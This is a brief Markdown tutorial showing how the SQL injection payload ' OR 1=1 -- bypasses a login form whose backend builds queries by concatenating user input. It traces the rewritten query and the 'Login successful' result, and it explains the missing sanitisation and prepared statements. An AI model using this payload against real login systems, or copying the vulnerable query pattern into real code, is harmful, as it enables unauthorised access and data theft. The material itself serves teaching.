# ⚔️ SQL Injection Attack

## 🧠 Scenario
A login form accepts:
- username
- password

Backend query:

```sql
SELECT * FROM users WHERE username = 'input' AND password = 'input';
```

---

## 🚀 Step 1: Identify Injection Point
- Input fields accept raw data
- No validation present

---

## 🚀 Step 2: Inject Payload

```sql
' OR 1=1 --
```

---

## 🚀 Step 3: Result

Query becomes:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = ''
```

👉 `1=1` is always true → authentication bypass

---

## 🧪 Example

Input:
```
username: ' OR 1=1 --
password: anything
```

Output:
```
Login successful
```

---

## 🔥 Why It Works
- Input is directly inserted into SQL query
- No sanitization or prepared statements

---

## 🧠 Attacker Goal
- Bypass authentication
- Extract sensitive data
